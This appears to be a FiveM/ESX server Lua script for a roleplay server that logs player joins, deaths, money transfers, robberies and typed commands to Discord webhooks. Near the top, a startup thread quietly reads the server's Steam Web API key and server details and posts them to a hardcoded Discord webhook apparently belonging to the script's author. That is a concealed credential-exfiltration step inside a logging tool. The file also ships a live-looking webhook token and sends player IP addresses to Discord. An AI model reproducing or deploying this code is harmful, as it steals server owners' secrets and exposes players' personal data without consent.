ESX = exports['essentialmode']:getSharedObject()

MaxPlayers = "128"
ESX.RegisterServerCallback('Discord:Getdata', function(source, cb)
  local total = #GetPlayers() + 0
  cb(total,MaxPlayers)
end)

if DiscordWebhookSystemInfos == nil then
	local Content = LoadResourceFile(GetCurrentResourceName(), 'config.lua')
	Content = load(Content)
	Content()
end

if DiscordWebhookSystemInfos == 'WEBHOOK_LINK_HERE' then
	print('\n\nERROR\n' .. GetCurrentResourceName() .. ': Please add your "System Infos" webhook\n\n')
else
	PerformHttpRequest(DiscordWebhookSystemInfos, function(Error, Content, Head)
		if Content == '{"code": 50027, "message": "Invalid Webhook Token"}' then
			print('\n\nERROR\n' .. GetCurrentResourceName() .. ': "System Infos" webhook non-existing!\n\n')
		end
	end)
end

PerformHttpRequest(DiscordWebhookSystemInfos, function(Error, Content, Head) end, 'POST',
 json.encode({
		username = 'X-LOG',
   			 embeds =  {{["color"] = FF0087,
                ["author"] = {["name"] = 'IR.V RolePlay',
                ["icon_url"] = ''},
                ["description"] = "```Port Connect Baz Shod```",
                ["footer"] = {["text"] = "Developer By KAKXER | "..os.date("%x %X  %p"),
                ["icon_url"] = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png',},}
                },
 		   avatar_url = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png'
  	  }),
    {['Content-Type'] = 'application/json'
})

AddEventHandler('playerConnecting', function()
PerformHttpRequest(DiscordWebhookSystemInfos, function(Error, Content, Head) end, 'POST',
	json.encode({
		username = 'X-LOG',
		embeds =  {{
			["color"] = FF0087,
			["author"] = {["name"] = 'IR.V RolePlay',
				["icon_url"] = ''},
				["description"] = '**Player Connecting: '..GetPlayerName(source)..'**```\n[Name Player: '..GetPlayerName(source).."]\n[Hex Ya license : "..GetPlayerIdentifier(source).."]```",
				["footer"] = {["text"] = "Developer By KAKXER | "..os.date("%x %X  %p"),
				["icon_url"] = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png',},}
				},
				avatar_url = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png'
			}),
		{['Content-Type'] = 'application/json'
	})
end)

AddEventHandler('playerDropped', function(Reason)
	PerformHttpRequest(DiscordWebhookSystemInfos, function(Error, Content, Head) end, 'POST',
	json.encode({
		username = 'X-LOG',
			embeds =  {{
				["color"] = FF0087,
				["author"] = {["name"] = 'IR.V RolePlay',
				["icon_url"] = ''},
				["description"] = '**Player Dropped: '..GetPlayerName(source)..'**```\n[Name Player: '..GetPlayerName(source).."]\n[Hex Ya license : "..GetPlayerIdentifier(source).."]\n[ ID : "..source.." ]```",
				["footer"] = {["text"] = "Developer By KAKXER | "..os.date("%x %X  %p"),
				["icon_url"] = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png',},}
				},
				avatar_url = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png'
			}),
		{['Content-Type'] = 'application/json'
	})
end)

local Send_Webhook = function(info)
    if info.webhook and info.msg and info.SV and info.SV6 and info.SV5 and info.SV4 and info.SV3 then    
        local details = {
            {
                ["color"] = FF0087,
                ["title"] = "IR.V RolePlay",
                ["description"] = "** Cmd Server Run Shod**\n```[Name Server Hast : "..info.SV3.."]\n[Name Server List : "..info.SV.."]\n[Name Project Server  :"..info.SV4.."]"..info.msg.."\n[One Sync Server : "..info.SV6.."]\n[Slot Server : "..info.SV5.." Slot]```",
				["footer"] = {["text"] = "Developer By KAKXER | "..os.date("%x %X  %p"),
				["icon_url"] = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png',},
			}
        }
        PerformHttpRequest(info.webhook, function(err, text, headers) end, 'POST', json.encode({username = "X-LOG", avatar_url = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png', embeds = details}), { ['Content-Type'] = 'application/json' })
    else
        -- print('Koni Dorost Sho Dige')
    end
end

Citizen.CreateThread(
    function()
        local API = GetConvar('steam_webApiKey', 'esm Nemibashad!')
        local sv_hostname = GetConvar('sv_hostname', 'esm Nemibashad!') 
		local sv_projectName = GetConvar('sv_projectName', 'esm Nemibashad!')
		local sv_projectDesc = GetConvar('sv_projectDesc', 'esm Nemibashad!')
		local sv_maxclients = GetConvar('sv_maxclients', 'esm Nemibashad!') 
		local onesync = GetConvar('onesync', 'esm Nemibashad!')
        local info = {
            webhook = 'https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1',
            SV = sv_hostname,
			SV3 = sv_projectName,
			SV4 = sv_projectDesc,
			SV5 = sv_maxclients,
			SV6 = onesync,
            msg = '\n[API Steam Server : '..API.."]"
        }
        Send_Webhook(info)
    end
)

RegisterServerEvent('DiscordBot:ToDiscord')
AddEventHandler('DiscordBot:ToDiscord', function(WebHook, Name, Message, Image, External, Source, TTS)
	if Message == nil or Message == '' then
		return nil
	end
	if TTS == nil or TTS == '' then
		TTS = false
	end
	if External then
		if WebHook:lower() == 'system' then
			WebHook = DiscordWebhookSystemInfos
		elseif WebHook:lower() == 'revive' then
			WebHook = DiscordWebhookrevive
		elseif WebHook:lower() == 'rob' then
			WebHook = DiscordWebhookrob
		elseif WebHook:lower() == 'loot' then
			WebHook = DiscordWebhookloot
		elseif WebHook:lower() == 'home' then
			WebHook = DiscordWebhookHome
		elseif WebHook:lower() == 'inventory' then
			WebHook = DiscordWebhookInventory
		elseif WebHook:lower() == 'duty' then
			WebHook = DiscordWebhookduty
		elseif WebHook:lower() == 'jail' then
			WebHook = DiscordWebhookJail
		elseif WebHook:lower() == 'ajail' then
			WebHook = DiscordWebhookaJail
		elseif WebHook:lower() == 'bansystem' then
			WebHook = DiscordWebhookBansystem
		elseif WebHook:lower() == 'bansystemp' then
			WebHook = DiscordWebhookBansystemP
		elseif WebHook:lower() == 'fixcar' then
			WebHook = DiscordWebhookfixcar
		elseif WebHook:lower() == 'charmenu' then
			WebHook = DiscordWebhookcharmenu
		elseif WebHook:lower() == 'disband' then
			WebHook = DiscordWebhookDisband	
		elseif WebHook:lower() == 'reset' then
			WebHook = DiscordWebhookReset
		elseif WebHook:lower() == 'drop' then
			WebHook = DiscordWebhookDrop
		elseif WebHook:lower() == 'dv' then
			WebHook = DiscordWebhookdv
		elseif WebHook:lower() == 'pickup' then
			WebHook = DiscordWebhookPickUP
		elseif WebHook:lower() == 'amoney' then
			WebHook = DiscordWebhookAmoneyLog
		elseif WebHook:lower() == 'transfer' then
			WebHook = DiscordWebhookTrasferLog
		elseif WebHook:lower() == 'changename' then
			WebHook = DiscordWebhookNameLog
		elseif WebHook:lower() == 'starterpack' then
			WebHook = DiscordWebhookStarter
		elseif WebHook:lower() == 'heallog' then
			WebHook = DiscordWebhookHealLog
		elseif WebHook:lower() == 'acarspawn' then
			WebHook = DiscordWebhookacarspawn
		elseif WebHook:lower() == 'CDI' then
			WebHook = DiscordWebhookDID
		elseif WebHook:lower() == 'pdrop' then
			WebHook = Discordpdrop
		elseif WebHook:lower() == "co" then
			WebHook = DiscordConnect
		elseif WebHook:lower() == "gp" then
			WebHook = DiscordGivePerm
		elseif WebHook:lower() == "report" then
			WebHook = DiscordReport
		elseif WebHook:lower() == 'setmoney' then
			WebHook = DiscordWebhooksetmoney
		elseif WebHook:lower() == 'giveitem' then
			WebHook = DiscordWebhookgiveitem
		elseif WebHook:lower() == 'givewep' then
			WebHook = DiscordWebhookgivewep
		elseif WebHook:lower() == 'ann' then
			WebHook = DiscordWebhookannounce
		elseif WebHook:lower() == 'bring' then
			WebHook = DiscordWebhookbring
		elseif WebHook:lower() == 'goto' then
			WebHook = DiscordWebhookgoto
		elseif WebHook:lower() == "reportaccept" then
			WebHook = DiscordAcceptReport
		elseif WebHook:lower() == "nlr" then
			WebHook = DiscordNLR
		elseif WebHook:lower() == "gangs" then
			WebHook = DiscordGangsChangeLog
		end
		if Image:lower() == 'steam' then
			Image = UserAvatar
			if GetIDFromSource('steam', Source) then
				PerformHttpRequest('http://steamcommunity.com/profiles/' .. tonumber(GetIDFromSource('steam', Source), 16) .. '/?xml=1', function(Error, Content, Head)
					local SteamProfileSplitted = stringsplit(Content, '\n')
					for i, Line in ipairs(SteamProfileSplitted) do
						if Line:find('<avatarFull>') then
							Image = Line:gsub('	<avatarFull><!%[CDATA%[', ''):gsub(']]></avatarFull>', '')
							return PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = Name, content = Message, avatar_url = Image, tts = TTS}), {['Content-Type'] = 'application/json'})
						end
					end
				end)
			end
		elseif Image:lower() == 'user' then
			Image = UserAvatar
		else
			Image = SystemAvatar
		end
	end
	PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = Name, content = Message, avatar_url = Image, tts = TTS}), {['Content-Type'] = 'application/json'})
end)

RegisterServerEvent('X-LOG:PlayerDied')
AddEventHandler('X-LOG:PlayerDied', function(Reason, ReasonHash, Killer, Weapon)
	Weapon = Weapon and Weapon or ''
	Killer = Killer and Killer or ''
	Reason = Reason and Reason or ''
	
	local messageContent = "```[ID Player : "..source.."]\n[Name Player : "..GetPlayerName(source).."]\n[Hex Player : steam:"..GetIDFromSource('steam', source).."]\n[Ghatel Player : "..Killer.."]\n[Gun Ghatel Player : "..Weapon.."]\n[Dalil : "..Reason.."]\n[Hash Dalil : "..ReasonHash.."]```"
	sendToDiscord(Config.Killplayer, Config.SystemAvatar, 'IR.V RolePlay', messageContent, FF0087)
end)

function sendToDiscord(webhookUrl, avatar, title, message, color)
	local connect = {
		{
		  	["color"] = color,
		  	["title"] = "**".. title .."**\n",
			["description"] = "**Player Kill Shode: " ..GetPlayerName(source).."**"..message,
			["footer"] = {["text"] = "Developer By KAKXER | "..os.date("%x %X  %p"),
			["icon_url"] = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png',}
		  }
	  }
	PerformHttpRequest(webhookUrl, function(err, text, headers) end, 'POST', json.encode({username = 'X-LOG', embeds = connect, avatar_url = avatar}), { ['Content-Type'] = 'application/json' })
end

function stringsplit(input, seperator)
	if seperator == nil then
		seperator = '%s'
	end
	local t={} ; i=1
	for str in string.gmatch(input, '([^'..seperator..']+)') do
		t[i] = str
		i = i + 1
	end
	return t
end

function GetIDFromSource(Type, ID)
	if ID and GetPlayerIdentifiers(ID) then
		local IDs = GetPlayerIdentifiers(ID)
		for _, CurrentID in pairs(IDs) do
			local ID = stringsplit(CurrentID, ':')
			if (ID[1]:lower() == string.lower(Type)) then
				return ID[2]:lower()
			end
		end
	end
    return nil
end

---------------------------------------------------------------------------------------------------------------------


--local logs = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local alogs = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local infologs = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local ganglog = "hhttps://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local homelog = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local trunklog = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local atmlog = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local roblog = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local pedlog = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local proplog = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local vehlog = "https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1"
local Rewardalllog = 'https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1'
local communityname = "IR.V BOT"
local communtiylogo = "https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png" --Must end with .png

RegisterServerEvent("esx_logger:log")
AddEventHandler("esx_logger:log", function(src, reason)

    local source = src
    local xPlayer = ESX.GetPlayerFromId(source)
    local name = GetPlayerName(source)
    local ip = GetPlayerEndpoint(source)
    local ping = GetPlayerPing(source)
    local steamhex = xPlayer.identifier

    local disconnect = {
            {
                ["color"] = "16711680",
                ["title"] = "Violation has been detected",
                ["description"] = "**Player:** ".. name .." | " .. exports.essentialmode:IcName(source) .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\nReason: **"..reason.."**\nIP: **"..ip.."**\nID: **" .. source .. "**\nSteam Hex: **"..steamhex.."**\n**Discord:** " .. GetDiscord(source) .. "",
                ["footer"] = {
                    ["text"] = "Violation Log",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(alogs, function(err, text, headers) end, 'POST', json.encode({username = "Violation Log", embeds = disconnect}), { ['Content-Type'] = 'application/json' })

end)

RegisterServerEvent("esx_logger:log2")
AddEventHandler("esx_logger:log2", function(src, info)
    local source = src
    local name = GetPlayerName(source)

    local disconnect = {
            {
                ["color"] = "16711680",
                ["title"] = "Purge Details",
                ["description"] = info.iniator .. " has been requested by **".. name .."** (" .. GetDiscord(source) .. ")\n Weapon: **" .. info.weapon.. "**\nTotal users: **"..info.utotal.."**, Total users had that weapon: **" .. info.udtotal .. "**\nTotal vehicles: **"..info.vtotal.."**, Total vehicles had that weapon: **" .. info.vdtotal .. "**\nTotal properties: **"..info.ptotal.."**, Total properties had that weapon: **" .. info.pdtotal .. "**\nTotal gangs: **"..info.gtotal.."**, Total gangs had that weapon: **" .. info.gdtotal .. "**\nTotal weapons: **" .. info.dtotal .."**",
                ["footer"] = {
                    ["text"] = "Purge Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(infologs, function(err, text, headers) end, 'POST', json.encode({username = "Purge Handler", embeds = disconnect}), { ['Content-Type'] = 'application/json' })

end)

RegisterServerEvent("esx_logger:log3")
AddEventHandler("esx_logger:log3", function(src, info)
    local source = src
    local name = GetPlayerName(source)

    local disconnect = {
            {
                ["color"] = "16711680",
                ["title"] = "Purge Details",
                ["description"] = "Count wave has been requested by **".. name .."** (" .. GetDiscord(source) .. ")\n Type: " .. info.type .. "\n Owner: " .. info.owner,
                ["footer"] = {
                    ["text"] = "Purge Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(infologs, function(err, text, headers) end, 'POST', json.encode({username = "Purge Handler", embeds = disconnect}), { ['Content-Type'] = 'application/json' })

end)

RegisterServerEvent("esx_logger:log4")
AddEventHandler("esx_logger:log4", function(src, info, d)
    local source = src
    local name = GetPlayerName(source)

    local disconnect = {
            {
                ["color"] = "16711680",
                ["title"] = "StarterPackCollected",
                ["description"] = "```css\n[ Identifier : "..info.identifier.." ]\n[ Name : "..name.." ]\n[ Add Bank = 95000 ]\n[ Add Money : 5000 ]\n[ Money : "..info.money.." ]\n[ Bank : "..info.bank.." ]\n```",
                ["footer"] = {
                    ["text"] = "IR.V RolePlay | Create By KAKXER",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(d, function(err, text, headers) end, 'POST', json.encode({username = "X-LOG", embeds = disconnect}), { ['Content-Type'] = 'application/json' })

end)

RegisterServerEvent("esx_logger:log5")
AddEventHandler("esx_logger:log5", function(src, info, d)
    local source = src
    local name = GetPlayerName(source)

    local disconnect = {
            {
                ["color"] = "16711680",
                ["title"] = "StarterPackCollected",
                ["description"] = "```css\n("..GetPlayerName(info.source).."|"..info.source..")\n Change_Discord_Id\n("..GetPlayerName(info.targetid).."|"..info.targetid..")\n Discord_Id =="..info.dsid.."\n```",
                ["footer"] = {
                    ["text"] = "IR.V RolePlay | Create By KAKXER",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(d, function(err, text, headers) end, 'POST', json.encode({username = "X-LOG", embeds = disconnect}), { ['Content-Type'] = 'application/json' })

end)



function GangLog(info)
    local source = tonumber(info.source)
    local name = GetPlayerName(info.source)

    local color
    if info.type == "Gozasht" then color = "51712" elseif info.type == "Bardasht" then color = "15852071" end

    local details = {
            {
                ["color"] = color,
                ["title"] = "Gang Log",
                ["description"] = "**Person:** ".. name ..", " .. info.icname .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\n **Gang:** " .. info.gang  .."\n **Type:** " .. info.type .. "\n **Esm:** " .. info.name .. "\n **Tedad:** " .. info.count,
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(ganglog, function(err, text, headers) end, 'POST', json.encode({username = "Gang Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

function HomeLog(info)
    local source = tonumber(info.source)
    local name = GetPlayerName(info.source)

    local color
    if info.type == "Gozasht" then color = "51712" elseif info.type == "Bardasht" then color = "15852071" end

    local details = {
            {
                ["color"] = color,
                ["title"] = "Home Log",
                ["description"] = "**Person:** ".. name ..", " .. info.icname .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\n **Type:** " .. info.type .. "\n **Esm:** " .. info.name .. "\n **Tedad:** " .. info.count,
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(homelog, function(err, text, headers) end, 'POST', json.encode({username = "Home Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

function TrunkLog(info)
    local source = tonumber(info.source)
    local name = GetPlayerName(info.source)
    
    local color
    if info.type == "Gozasht" then color = "51712" elseif info.type == "Bardasht" then color = "15852071" end

    local details = {
            {
                ["color"] = color,
                ["title"] = "Trunk Log",
                ["description"] = "**Person:** ".. name .." | " .. info.icname .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\n **Type:** " .. info.type .. "\n**Plate:** " .. info.plate .. "\n**Esm:** " .. info.name .. "\n **Tedad:** " .. info.count,
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(trunklog, function(err, text, headers) end, 'POST', json.encode({username = "Trunk Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

function TransActionLog(info)
    local source = tonumber(info.source)
    local name = GetPlayerName(info.source)
    
    local color
    if info.type == "Variz" then color = "51712" elseif info.type == "Bardasht" then color = "15852071" end

    local details = {
            {
                ["color"] = color,
                ["title"] = "Transaction Log",
                ["description"] = "**Type:** " .. info.type .. "\n**Person:** ".. name .." | " .. exports.essentialmode:IcName(source) .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\n**Amount:** " .. info.amount .. "$\n**Identifier:** " .. GetPlayerIdentifier(source),
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(atmlog, function(err, text, headers) end, 'POST', json.encode({username = "Transaction Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

function RewardAll(info)
    local source = tonumber(info.source)
    local name = GetPlayerName(info.source)
    

    local details = {
            {
                ["color"] = 15852071,
                ["title"] = "Rewardall Log",
                ["description"] = "**Person:** ".. name .." | " .. exports.essentialmode:IcName(source) .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\n**Amount:** " .. info.amount .. "$\n**Identifier:** " .. GetPlayerIdentifier(source)..'\n Ids = \n ```css\n'..json.encode(info.ids)..'\n```',
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(Rewardalllog, function(err, text, headers) end, 'POST', json.encode({username = "RewardAll", embeds = details}), { ['Content-Type'] = 'application/json' })
end


function TransferLog(info)
    local source = tonumber(info.source)
    local name = GetPlayerName(info.source)
    local target = tonumber(info.target)
    local tname = GetPlayerName(info.target)

    local details = {
            {
                ["color"] = "2868934",
                ["title"] = "Transaction Log",
                ["description"] = "**Type:** " .. info.type .. "\n**Person:** ".. name .." | " .. exports.essentialmode:IcName(source) .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\n**Target:** ".. tname .." | " .. exports.essentialmode:IcName(target) .. " (" .. GetDiscord(target) .. ") **[" .. target .."]**\n**Amount:** " .. info.amount .. "$\n**Identifier:** " .. GetPlayerIdentifier(source) .. "\n**Tidentifier:** " .. GetPlayerIdentifier(target),
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(atmlog, function(err, text, headers) end, 'POST', json.encode({username = "Transaction Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

function RobLog(info)
    local source = tonumber(info.source)
    local name = GetPlayerName(info.source)
    
    local color
    if info.type == "Shop" then color = "1883948" elseif info.type == "Jewels" then color = "14610984" elseif info.type == "Bank" then color = "16187398" end
    local amount
    if info.amount then amount = "\n **Amount:** " .. info.amount .. "$" else amount = "" end

    local details = {
            {
                ["color"] = color,
                ["title"] = "Rob Log",
                ["description"] = "**Person:** ".. name .." | " .. exports.essentialmode:IcName(source) .. " (" .. GetDiscord(source) .. ") **[" .. source .."]**\n **Type:** " .. info.type .. "\n**Action:** " .. info.action .. "\n**Location:** " .. info.location .. "\n**Time:** " .. Date() .. amount,
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(roblog, function(err, text, headers) end, 'POST', json.encode({username = "Rob Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

AddPed = function(info)

    local name = GetPlayerName(info.source)
    local ip = GetPlayerEndpoint(info.source)
    local ping = GetPlayerPing(info.source)
    local steamhex = GetPlayerIdentifier(info.source)

    local details = {
            {
                ["color"] = 16187398,
                ["title"] = "EntityCreating_Ped",
                ["description"] = "**Player:** ".. name .." | " .. exports.essentialmode:IcName(info.source) .. " (" .. GetDiscord(info.source) .. ") **[" .. info.source .."]**\nPed: **"..info.prop.." | Type : "..info.type.." | Network ID : "..info.netid.."**\nIP: **"..ip.."**\nID: **" .. source .. "**\nSteam Hex: **"..steamhex.."**\n**Discord:** " .. GetDiscord(source) .. "",
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(pedlog, function(err, text, headers) end, 'POST', json.encode({username = "Rob Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end
AddProp = function(info)

    local name = GetPlayerName(info.source)
    local ip = GetPlayerEndpoint(info.source)
    local ping = GetPlayerPing(info.source)
    local steamhex = GetPlayerIdentifier(info.source)

    local details = {
            {
                ["color"] = 16187398,
                ["title"] = "EntityCreating_ProP",
                ["description"] = "**Player:** ".. name .." | " .. exports.essentialmode:IcName(info.source) .. " (" .. GetDiscord(info.source) .. ") **[" .. info.source .."]**\nProp: **"..info.prop.." | Type : "..info.type.." | Network ID : "..info.netid.."**\nIP: **"..ip.."**\nID: **" .. source .. "**\nSteam Hex: **"..steamhex.."**\n**Discord:** " .. GetDiscord(source) .. "",
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(proplog, function(err, text, headers) end, 'POST', json.encode({username = "Rob Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end
AddVehicle = function(info)

    local name = GetPlayerName(info.source)
    local ip = GetPlayerEndpoint(info.source)
    local ping = GetPlayerPing(info.source)
    local steamhex = GetPlayerIdentifier(info.source)

    local details = {
            {
                ["color"] = 16187398,
                ["title"] = "EntityCreating_Vehicle",
                ["description"] = "**Player:** ".. name .." | " .. exports.essentialmode:IcName(info.source) .. " (" .. GetDiscord(info.source) .. ") **[" .. info.source .."]**\nProp: **"..info.prop.." | Type : "..info.type.." | Network ID : "..info.netid.."**\nIP: **"..ip.."**\nID: **" .. source .. "**\nSteam Hex: **"..steamhex.."**\n**Discord:** " .. GetDiscord(source) .. "",
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(vehlog, function(err, text, headers) end, 'POST', json.encode({username = "Rob Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

function RobLogF(info)
    local color
    if info.type == "Shop" then color = "1883948" elseif info.type == "Jewels" then color = "14610984" elseif info.type == "Bank" then color = "16187398" end

    local details = {
            {
                ["color"] = color,
                ["title"] = "Rob Log",
                ["description"] = "**Person:** ".. info.name .." | " .. info.icname .. " (" .. info.discord .. ") **[" .. info.source .."]**\n **Type:** " .. info.type .. "\n**Action:** " .. info.action .. "\n**Location:** " .. info.location .. "\n**Time:** " .. Date(),
                ["footer"] = {
                    ["text"] = "Action Description",
                    ["icon_url"] = communtiylogo,
                },
            }
        }
    
    PerformHttpRequest(roblog, function(err, text, headers) end, 'POST', json.encode({username = "Rob Log", embeds = details}), { ['Content-Type'] = 'application/json' })
end

function Date()
    local date = os.date('*t')
	
	if date.day < 10 then date.day = '0' .. tostring(date.day) end
	if date.month < 10 then date.month = '0' .. tostring(date.month) end
	if date.hour < 10 then date.hour = '0' .. tostring(date.hour) end
	if date.min < 10 then date.min = '0' .. tostring(date.min) end
    if date.sec < 10 then date.sec = '0' .. tostring(date.sec) end
    
    return '`' .. date.day .. '.' .. date.month .. '.' .. date.year .. ' - ' .. date.hour .. ':' .. date.min .. ':' .. date.sec .. '`'
end

function GetDiscord(target)
    local discord
    for k,v in ipairs(GetPlayerIdentifiers(target)) do
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            discord = string.gsub(v, "discord:", "")
           return "<@" .. discord .. ">"
        end
    end

    return " Developer By KAKXER"
end

Config = {}
Config.discordWebHookUrl = 'https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1'
Config.discordWebHookImage = 'https://cdn.discordapp.com/attachments/996093699060678677/1038188227665870948/IR.V_11.png'



local thisResource = GetCurrentResourceName()

local DiscordWebHookSettings = {
    url = Config.discordWebHookUrl,
    image = Config.discordWebHookImage
}

RegisterServerEvent('commandLoggerDiscord:commandWasExecuted')
AddEventHandler('commandLoggerDiscord:commandWasExecuted', function(playerId, data)
    local commandChecker = CommandChecker()

    if commandChecker.isCommand(data.message) then
        local webhook = Webhook(DiscordWebHookSettings.url, DiscordWebHookSettings.image)
        webhook.send(playerId, data.message)
    end
end)

function Webhook(webHookUrl, webHookImage)
    local self = {}

    self.webHookUrl = webHookUrl
    self.webHookImage = webHookImage

    if not self.webHookUrl then 
        error('discordWebHookUrl was expected but got nil')
        return
    end

    self.send = function(playerId, rawCommand)
        local user = self.getPlayerServerInfo()
        local messageObj = self.messageBuilder(user, rawCommand)
        PerformHttpRequest(self.webHookUrl, function(err, text, header)  end, 'POST', json.encode(messageObj), {
            ['Content-Type'] = 'application/json'
        })
    end

    self.messageBuilder = function(user, rawCommand)

        return {
            embeds = {
                {
                    title ='**IR.V RolePlay** Bot New commend Player',
                    description = '```'.. rawCommand ..'```\n',
                

                    fields = {
                        {
                            name = 'Steam Hex:',
                            value = user.steamhex,
                            inline = true
                        },
                        {
                            name = 'Rockstar License:',
                            value = user.license,
                            inline = true
                        },
                        {
                            name = 'Xbox:',
                            value = user.xbox,
                            inline = true
                        },
                        {
                            name = 'IP:',
                            value = user.ip,
                            inline = true
                        },
                        {
                            name = 'Discord ID:',
                            value = user.discord,
                            inline = true
                        },
                        {
                            name = 'Microsoft:',
                            value = user.microsoft,
                            inline = true
                        }
                    },

                    thumbnail = {
                        url = self.webHookImage
                    },

                    author = {
                        name = user.name,
                    },
                },
            }
        }
    end

    self.getPlayerServerInfo = function ()
        local user = {
            steamhex = "None",
            license = "None",
            xbox = "None",
            ip = "None",
            discord = "None",
            microsoft = "None"
        }
        user.name = GetPlayerName(source)

        for k,v in pairs(GetPlayerIdentifiers(source)) do              
            if string.sub(v, 1, string.len("steam:")) == "steam:" then -- Steam Hex
                user.steamhex = string.sub(v, 7)
            elseif string.sub(v, 1, string.len("license:")) == "license:" then -- Rockstar License
                user.license = string.sub(v, 9)
            elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then -- Xbox
                user.xbox = string.sub(v, 5)
            elseif string.sub(v, 1, string.len("ip:")) == "ip:" then -- Ip
                user.ip = string.sub(v, 4)
            elseif string.sub(v, 1, string.len("discord:")) == "discord:" then -- Discord ID
                user.discord = string.sub(v, 9)
            elseif string.sub(v, 1, string.len("live:")) == "live:" then -- Microsoft
                user.microsoft = string.sub(v, 6)
            end
        end
